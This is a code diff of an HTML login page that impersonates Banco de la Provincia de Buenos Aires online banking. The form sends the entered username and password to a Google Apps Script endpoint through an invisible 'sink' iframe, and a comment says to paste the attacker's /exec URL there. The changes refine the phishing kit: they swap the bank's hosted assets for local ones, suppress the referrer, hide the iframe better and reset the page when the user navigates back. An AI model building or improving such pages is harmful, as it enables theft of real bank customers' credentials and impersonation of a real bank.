@@ -4,11 +4,9 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="robots" content="noindex">
+<meta name="referrer" content="no-referrer">
 <title>Banco de la Provincia de Buenos Aires</title>
-<link rel="icon" href="https://www.bancoprovincia.bancainternet.com.ar/spa/favicon.ico">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Encode+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23007a2b'/%3E%3Ctext x='16' y='23' font-family='sans-serif' font-size='19' font-weight='700' fill='%23fff' text-anchor='middle'%3EB%3C/text%3E%3C/svg%3E">
 <style>
   :root{
     --verde-osc:#007a2b;
@@ -27,11 +25,11 @@
   html,body{height:100%}
   body{
     margin:0;
-    font-family:"Encode Sans",system-ui,sans-serif;
+    font-family:"Encode Sans",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
     font-size:1rem; line-height:1.5rem; color:var(--gris);
-    background-color:#fff;
-    background-image:url("https://www.bancoprovincia.bancainternet.com.ar/spa/assets/login-Dl1yShgU.png");
-    background-repeat:no-repeat; background-position:center; background-size:cover;
+    background-color:#eef3f7;
+    background-image:linear-gradient(160deg,#e8f1f7 0%,#f4f8f5 55%,#eaf2ea 100%);
+    background-attachment:fixed;
   }
   .login-wrap{min-height:calc(var(--vh) * 100); display:flex; align-items:center; justify-content:center}
   .login-content{
@@ -105,7 +103,7 @@
     animation:girar .8s linear infinite;
   }
   @keyframes girar{to{transform:rotate(360deg)}}
-  iframe.sink{display:none}
+  iframe.sink{position:absolute; width:0; height:0; border:0; visibility:hidden}
   @media (min-width:768px){
     .header-gradient{height:calc(7.5rem + var(--safe-top))}
     .header-gradient img{height:2.875rem}
@@ -127,23 +125,16 @@
   <div class="login-content">
 
     <div class="header-gradient">
-      <img src="https://www.bancoprovincia.com.ar/CDN/Get/logo_mobile_bip"
-           alt="Banco de la Provincia de Buenos Aires">
+      <img src="logo.png" alt="Banco de la Provincia de Buenos Aires"
+           onerror="this.onerror=null;this.src='https://www.bancoprovincia.com.ar/CDN/Get/logo_mobile_bip'">
     </div>
 
     <div class="cuerpo">
       <h1>Iniciá sesión</h1>
 
-      <!-- ▼▼▼ PEGÁ ACÁ TU URL /exec ▼▼▼ -->
+      <!-- ▼▼▼ PEGÁ ACÁ TU URL /exec (Paso 9) ▼▼▼ -->
       <form id="form1" method="POST" target="sink" autocomplete="off"
-            action="https://script.google.com/macros/s/AKfycbXXXXXXXXXXXXXXXXXXXX/exec">
-
-        <input type="hidden" name="sesion">
-        <input type="hidden" name="Fecha">
-        <input type="hidden" name="Dispositivo">
-        <input type="hidden" name="Pantalla">
-        <input type="hidden" name="Zona">
-        <input type="hidden" name="Idioma">
+            action="https://script.google.com/macros/s/PEGA_TU_ID_ACA/exec">
 
         <div class="campo">
           <label for="username">Tu usuario</label>
@@ -204,31 +195,13 @@
   var sink    = document.querySelector('iframe.sink');
   var overlay = $('overlay');
   var enviado = false, salido = false;
-  var sesion  = 'BIP-' + Math.random().toString(36).slice(2, 8).toUpperCase();
 
-  /* altura real del viewport (para el layout mobile) */
   function setVh() {
     document.documentElement.style.setProperty('--vh', window.innerHeight * 0.01 + 'px');
   }
   setVh();
   window.addEventListener('resize', setVh);
   window.addEventListener('orientationchange', setVh);
-
-  /* datos del dispositivo -> inputs hidden */
-  (function huella() {
-    var d = {
-      Fecha:       new Date().toLocaleString('es-AR'),
-      Dispositivo: navigator.userAgent,
-      Pantalla:    screen.width + 'x' + screen.height,
-      Zona:        Intl.DateTimeFormat().resolvedOptions().timeZone,
-      Idioma:      navigator.language,
-      sesion:      sesion
-    };
-    Object.keys(d).forEach(function (k) {
-      var i = form.querySelector('input[name="' + k + '"]');
-      if (i) i.value = d[k];
-    });
-  })();
 
   function salir() {
     if (salido) return;
@@ -240,12 +213,20 @@
     if (enviado) { e.preventDefault(); return; }
     enviado = true;
     overlay.classList.add('on');
-    setTimeout(salir, 1600);   /* tope, por si el iframe nunca avisa */
+    setTimeout(salir, 5000);          /* último recurso si el iframe nunca avisa */
   });
 
-  /* el iframe cargó = el POST ya llegó, salimos antes */
+  /* el iframe cargó = el POST ya llegó */
   sink.addEventListener('load', function () {
-    if (enviado) setTimeout(salir, 300);
+    if (enviado) setTimeout(salir, 400);
+  });
+
+  /* si vuelven con "atrás", rearmamos todo */
+  window.addEventListener('pageshow', function (ev) {
+    if (!ev.persisted) return;
+    enviado = false;
+    salido  = false;
+    overlay.classList.remove('on');
   });
 
   /* mostrar / ocultar clave */
